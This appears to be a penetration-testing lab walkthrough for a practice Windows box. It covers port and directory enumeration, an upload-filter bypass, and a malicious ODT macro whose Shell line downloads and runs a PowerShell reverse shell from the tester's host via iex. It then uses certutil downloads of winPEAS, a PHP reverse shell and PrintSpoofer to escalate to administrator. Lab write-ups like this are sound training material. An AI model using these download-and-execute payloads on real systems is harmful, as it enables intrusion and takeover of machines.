`nmap -A -T4 -p- 192.168.136.169`

ICMP was blocked so I had to adjust.
`nmap -A -T4 -p- -Pn 192.168.136.169`

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Craft
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
```


# Enum
Web Page seems like a pretty standard webpage, besides the fact it has an upload for resumes which allows all files. My guess is we have to upload a shell and find where it is stored on the backend to get execution of the shell.

![](Images/Pasted%20image%2020250514213127.png)

![](Images/Pasted%20image%2020250514213221.png)

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.136.169/FUZZ
```

![](Images/Pasted%20image%2020250514214208.png)

Uploads directory is available. So lets upload a shell and see if we can get execution.

![](Images/Pasted%20image%2020250514213459.png)

Turns out we may have to do some bypass. Lets open up burp and test some basic bypasses.

![](Images/Pasted%20image%2020250514213612.png)

First lets test some double extensions

![](Images/Pasted%20image%2020250514213820.png)

`.php.odt` was allowed to be uploaded but it doesn't go to the uploads folder. Looks like we have to do more enumeration

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.136.169/FUZZ.php
```

I can't seem to find the uploads directory, now that I am thinking about it this may be a box related to the Office Scripts portion of the course. Lets see if I can find anything there. (edit I must have been hallucinating because on a second look I don't see anything Office related on the syllabus). That being said I found this [resource] which covers malicious payloads in ODT files.

Following this guide I was able to do a test payload to transfer over Netcat.

![](Images/Pasted%20image%2020250514220602.png)

This script gets ran and downloads Netcat from my local hosted HTTP server

![](Images/Pasted%20image%2020250514220628.png)

So we should now be able to establish a foothold through this pathway.

![](Images/Pasted%20image%2020250514220937.png)

This ended up not working so lets see if we can make an easy shell via powershell instead of fiddling with Netcat.

```
	Shell("cmd /c powershell iwr http://192.168.45.244/rev.ps1 -o C:/Windows/Tasks")
	Shell ("cmd /c powershell -c C:/Windows/Tasks/rev.ps1")
```

![](Images/Pasted%20image%2020250514221503.png)

![](Images/Pasted%20image%2020250514221258.png)

After a while of not getting execution I finally found the proper way of fixing the macro

```
	Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://192.168.45.244/rev.ps1')""")
```

![](Images/Pasted%20image%2020250514222904.png)

Upon the documents open, it downloads our malicious payload and executes it. Leading us to gain our initial shell and our first flag.

![](Images/Pasted%20image%2020250514222938.png)

![](Images/Pasted%20image%2020250514223021.png)


# Post Exploitation

Quick check of priv

![](Images/Pasted%20image%2020250514224229.png)

Nothing of note there for the time being. Lets just go ahead and run winpeas.

```
certutil -urlcache -f http://192.168.45.244:80/winPEASany.exe winpeas.exe
```

![](Images/Pasted%20image%2020250514224919.png)

We have the apache user which could be beneficial if we can laterally move to that account. We could probably do this by placing a file directly in the root directory of the web server if we have write access. Similar to my initial access thoughts but we were limited by the .odt file. That actually sounds like its probably a good idea lets go ahead and try that.

```
certutil -urlcache -f http://192.168.45.244:80/php-reverse-shell.php php-reverse-shell.php
```

We indeed had write access, so now we have access to both thecybergeek and the apache account. Lets see if we can escalate to Admin.

![](Images/Pasted%20image%2020250514225252.png)

![](Images/Pasted%20image%2020250514225516.png)

![](Images/Pasted%20image%2020250514225528.png)

We have found our escalation path, the apache account has SeImpersonatePriv

![](Images/Pasted%20image%2020250514225557.png)

A quick search of the build `10.0.17763 N/A Build 17763` gets us PrintSpoofer as our escalation path. Which can be found [here](https://github.com/itm4n/PrintSpoofer)

```
certutil -urlcache -f http://192.168.45.244:80/PrintSpoofer64.exe PrintSpoofer64.exe
```

`PrintSpoofer.exe -i -c cmd`

![](Images/Pasted%20image%2020250514230028.png)

Lets go ahead and take our victory lap.











